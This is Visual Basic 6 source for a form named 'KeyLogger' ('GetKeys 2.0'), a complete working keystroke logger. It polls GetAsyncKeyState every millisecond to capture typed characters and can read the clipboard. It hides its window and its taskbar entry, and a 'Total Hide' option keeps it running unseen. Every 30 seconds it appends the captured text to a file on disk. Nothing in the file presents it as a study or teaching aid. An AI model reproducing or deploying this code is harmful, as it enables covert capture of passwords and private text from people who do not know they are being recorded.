VERSION 5.00
Begin VB.Form KeyLogger 
   BorderStyle     =   0  'None
   Caption         =   "GetKeys 2.0"
   ClientHeight    =   1500
   ClientLeft      =   11220
   ClientTop       =   9300
   ClientWidth     =   3570
   FillColor       =   &H80000001&
   ForeColor       =   &H80000001&
   Icon            =   "KeyLogger.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1500
   ScaleWidth      =   3570
   ShowInTaskbar   =   0   'False
   Begin VB.Frame Frame1 
      BackColor       =   &H80000004&
      Height          =   1455
      Left            =   120
      TabIndex        =   0
      Top             =   0
      Width           =   3375
      Begin VB.CommandButton Command1 
         Appearance      =   0  'Flat
         Caption         =   "Total Hide"
         Height          =   255
         Left            =   240
         TabIndex        =   7
         Top             =   1080
         Width           =   975
      End
      Begin VB.CommandButton Command2 
         Caption         =   "Hide"
         Height          =   255
         Left            =   1200
         TabIndex        =   5
         Top             =   1080
         Width           =   855
      End
      Begin VB.TextBox Text1 
         Enabled         =   0   'False
         Height          =   495
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   3
         Top             =   120
         Width           =   3135
      End
      Begin VB.TextBox txtFileName 
         Height          =   285
         Left            =   2280
         TabIndex        =   2
         Text            =   "a:\text.txt"
         Top             =   720
         Width           =   975
      End
      Begin VB.CommandButton get 
         Caption         =   "Get Clipboard"
         Height          =   255
         Left            =   2040
         TabIndex        =   1
         Top             =   1080
         Width           =   1215
      End
      Begin VB.Label about 
         Caption         =   "?"
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   1080
         Width           =   135
      End
      Begin VB.Label Label2 
         Caption         =   "Output File Name:"
         Height          =   255
         Left            =   960
         TabIndex        =   4
         Top             =   720
         Width           =   1575
      End
   End
   Begin VB.Timer TimerSave 
      Interval        =   30000
      Left            =   3360
      Top             =   0
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   3360
      Top             =   480
   End
   Begin VB.Menu mnuSysTray 
      Caption         =   "SysTray"
      Visible         =   0   'False
      Begin VB.Menu mnuSysTrayExit 
         Caption         =   "E&xit"
      End
   End
End
Attribute VB_Name = "KeyLogger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private KeyLoop As Long
Private FoundKeys As String
Private KeyResult As Long
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private a(15) As String


Private Sub cmdExit_Click()
Call Timersave_Timer



    End
End Sub


Private Sub about_Click()
frmAbout.Show
End Sub

Private Sub Command1_Click()

MsgBox "GetKeys won't stop logging text until you restart."


KeyLogger.Hide

End Sub

Private Sub Command2_Click()

Call AddToTray(Me.Icon, Me.Caption, Me)

End Sub

Private Sub Form_Initialize()
a(0) = ")"
a(1) = "!"
a(2) = "@"
a(3) = "#"
a(4) = "$"
a(5) = "%"
a(6) = "^"
a(7) = "&"
a(8) = "*"
a(9) = "("
End Sub

Public Sub Form_Load()
    KeyLogger.Hide
    pass.Show
    App.TaskVisible = False
    LastKey = ""
    TimeOut = 0

End Sub

Private Sub get_Click()
Text1.Text = Clipboard.GetText
End Sub

Private Sub Timer1_Timer()
    Dim AddKey
    KeyResult = GetAsyncKeyState(13)
    If KeyResult = -32767 Then
        AddKey = vbCrLf
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(8)
    If KeyResult = -32767 Then
        l = Len(KeyLogger.Text1.Text)
        If l > 2 Then
            KeyLogger.Text1.Text = Left(KeyLogger.Text1.Text, l - 1)
            'AddKey = "...Bksp..."
            AddKey = ""
        Else
             AddKey = "(Cant Undo)"
        End If
        GoTo KeyFound
    End If
   
    
'------------FUNCTION KEYS
'------------SEPCIAL KEYS

KeyResult = GetAsyncKeyState(32)
    If KeyResult = -32767 Then
        AddKey = " "
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(186)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = ";" Else AddKey = ":"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(187)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(188)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "," Else AddKey = "<"
       GoTo KeyFound
    End If
   
KeyResult = GetAsyncKeyState(189)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(190)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(191)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"   '/
        GoTo KeyFound
    End If
  
KeyResult = GetAsyncKeyState(192)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "`" Else AddKey = "~"       '`
        GoTo KeyFound
    End If
     


'----------NUM PAD
KeyResult = GetAsyncKeyState(96)
    If KeyResult = -32767 Then
        AddKey = "0"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(97)
    If KeyResult = -32767 Then
        AddKey = "1"
        GoTo KeyFound
    End If
     

KeyResult = GetAsyncKeyState(98)
    If KeyResult = -32767 Then
        AddKey = "2"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(99)
    If KeyResult = -32767 Then
        AddKey = "3"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(100)
    If KeyResult = -32767 Then
        AddKey = "4"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(101)
    If KeyResult = -32767 Then
        AddKey = "5"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(102)
    If KeyResult = -32767 Then
        AddKey = "6"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(103)
    If KeyResult = -32767 Then
        AddKey = "7"
        GoTo KeyFound
    End If
    
    
KeyResult = GetAsyncKeyState(104)
    If KeyResult = -32767 Then
        AddKey = "8"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(105)
    If KeyResult = -32767 Then
        AddKey = "9"
        GoTo KeyFound
    End If
       
    
KeyResult = GetAsyncKeyState(106)
    If KeyResult = -32767 Then
        AddKey = "*"
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(107)
    If KeyResult = -32767 Then
        AddKey = "+"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(108)
    If KeyResult = -32767 Then
        AddKey = ""
        KeyLogger.Text1.Text = KeyLogger.Text1.Text & vbCrLf
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(109)
    If KeyResult = -32767 Then
        AddKey = "-"
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(110)
    If KeyResult = -32767 Then
        AddKey = "."
        GoTo KeyFound
    End If
 
KeyResult = GetAsyncKeyState(2)
    If KeyResult = -32767 Then
        AddKey = "/"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(220)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "\" Else AddKey = "|"
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(222)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "'" Else AddKey = Chr(34)
        GoTo KeyFound
    End If

KeyResult = GetAsyncKeyState(221)
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "]" Else AddKey = "}"
        
        
        GoTo KeyFound
    End If
    
KeyResult = GetAsyncKeyState(219) '219
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[" Else AddKey = "{"
        GoTo KeyFound
    End If
    
Skip:
    KeyLoop = 41
    Do Until KeyLoop = 127 ' otherwise check For numbers and letters
        KeyResult = GetAsyncKeyState(KeyLoop)
        If KeyResult = -32767 Then
            If KeyLoop > 64 And KeyLoop < 91 Then
                If GetCapslock = True And GetShift = True Then KeyLoop = KeyLoop + 32
                If GetCapslock = False And GetShift = False Then KeyLoop = KeyLoop + 32
            End If
            If KeyLoop > 47 And KeyLoop < 58 Then
                If GetShift = True Then
                    AddKey = a(Val(Chr(KeyLoop)))
                    GoTo KeyFound
                End If
            End If
            
           Text1.Text = Text1.Text + Chr(KeyLoop)
        End If
        KeyLoop = KeyLoop + 1
    Loop
    LastKey = AddKey
    Exit Sub
KeyFound:
KeyLogger.Text1 = KeyLogger.Text1 & AddKey
End Sub

Private Sub Timersave_Timer()
    On Error Resume Next
    Open KeyLogger.txtFileName For Append As #1
        Write #1, Text1.Text
        Text1.Text = ""
        Text1.Refresh
    Close #1
End Sub

 


Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)


    FormDrag Me
    End Sub


Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Unload Me
End

    FormDrag Me
    End Sub

Private Sub Form_FrameDown(Button As Integer, Shift As Integer, X As Single, Y As Single)


    FormDrag Me
    End Sub
Private Sub Frame1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)


    FormDrag Me
    End Sub
    
    
    
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If RespondToTray(X) <> 0 Then Call ShowFormAgain(Me)
End Sub


Private Sub Form_Unload(Cancel As Integer)
Call RemoveFromTray
End Sub



